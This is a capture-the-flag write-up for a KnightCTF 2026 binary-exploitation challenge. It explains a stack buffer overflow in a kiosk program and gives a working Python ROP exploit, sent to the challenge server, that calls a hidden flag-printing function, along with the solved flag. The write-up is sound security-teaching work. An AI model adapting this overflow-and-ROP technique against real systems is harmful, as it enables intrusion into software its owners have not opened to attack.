---
tags:
  - pwn
Date: 2026-01-20
draft: true
---

# Knight Squad Academy Kiosk - Writeup
KnightCTF 2026

## Challenge Information
**Name:** ksa_kiosk
**Category:** Pwn / Binary Exploitation
**Objective:** Find the flag `KCTF{...}`

## Analysis

### Initial Reconnaissance
We started by analyzing the provided binary `ksa_kiosk`.
- **File Type:** ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped.
- **Protections:**
    - **No PIE (Position Independent Executable):** Code addresses are fixed.
    - **NX (No Execute):** The stack is not executable (inferred standard protection).

### Reverse Engineering
Disassembling the binary revealed a menu-driven application with the following options:
1. Register cadet
2. Enrollment status
3. Exit

The vulnerability lies in the "Register cadet" function. Specifically, when asking for "Enrollment notes":

```assembly
4015b9:	48 8d 45 90          	lea    rax,[rbp-0x70]  ; Buffer starts at rbp-0x70 (112 decimal)
...
4015bd:	ba f0 00 00 00       	mov    edx,0xf0        ; Reads 0xF0 (240 decimal) bytes
...
4015ca:	e8 b1 fa ff ff       	call   401080 <read@plt>
```

The program allocates `0x70` (112 bytes) for the buffer but reads `0xF0` (240 bytes). This allows for a **Stack Buffer Overflow** of approximately 128 bytes, sufficient to overwrite the saved Base Pointer (RBP) and the Return Address (RIP).

### Identifying the Target
We found a hidden function at address `0x4013ac` (referenced in the binary but not called directly in the main flow).
Analysis of this function showed:

```assembly
4013b7:	48 89 bd 68 ff ff ff 	mov    QWORD PTR [rbp-0x98],rdi ; Saves 1st argument
4013be:	48 b8 ef be fe ca de 	movabs rax,0x1337c0decafebeef
4013c5:	c0 37 13 
4013c8:	48 39 85 68 ff ff ff 	cmp    QWORD PTR [rbp-0x98],rax ; Compares arg1 with magic value
4013cf:	74 2d                	je     4013fe <fopen@plt+0x32e> ; Jumps to flag printing if match
```

To get the flag, we need to call this function with the first argument (`rdi`) set to `0x1337c0decafebeef`.

## Exploitation Strategy

Since **No PIE** is enabled, we can use **ROP (Return Oriented Programming)** to bypass the need for shellcode.

1.  **Padding:** Fill the buffer (112 bytes) + saved RBP (8 bytes) = **120 bytes**.
2.  **ROP Chain:**
    *   **Gadget:** `pop rdi; ret` found at `0x40150b`. This pops the next value on the stack into the `rdi` register (the first argument for functions in x64 calling convention).
    *   **Argument:** `0x1337c0decafebeef` (the magic value required).
    *   **Target:** `0x4013ac` (The address of the hidden function).

### Payload Structure
```
[ 'A' * 120 ] + [ 0x40150b ] + [ 0x1337c0decafebeef ] + [ 0x4013ac ]
  Padding       pop rdi; ret       Magic Value          Win Function
```

## Solution Script

```python
import socket
import struct
import time

# Configuration
HOST = '66.228.49.41'
PORT = 5000

def p64(val):
    return struct.pack('<Q', val)

def interact():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        print(f"[+] Connected to {HOST}:{PORT}")

        # Wait for menu
        s.recv(1024)
        
        # Select Register cadet
        s.sendall(b"1\n")
        time.sleep(0.5)
        
        # Send dummy Name
        s.recv(1024)
        s.sendall(b"Hacker\n")
        time.sleep(0.5)
        
        # Send Payload in Notes
        s.recv(1024)
        
        # Construct Payload
        # Padding: 112 bytes buffer + 8 bytes Saved RBP = 120 bytes
        padding = b"A" * 120
        
        # Gadget: pop rdi; ret
        pop_rdi = 0x40150b
        
        # Argument: 0x1337c0decafebeef
        arg1 = 0x1337c0decafebeef
        
        # Target Function: print_flag (0x4013ac)
        print_flag = 0x4013ac
        
        rop_chain = p64(pop_rdi) + p64(arg1) + p64(print_flag)
        
        payload = padding + rop_chain
        
        print(f"[+] Sending payload of length {len(payload)}")
        s.sendall(payload)
        
        # Receive output
        time.sleep(1)
        data = s.recv(4096).decode(errors='ignore')
        print(data)
        
        s.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    interact()
```

## Flag
Running the exploit successfully returned:
```
KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_}
```
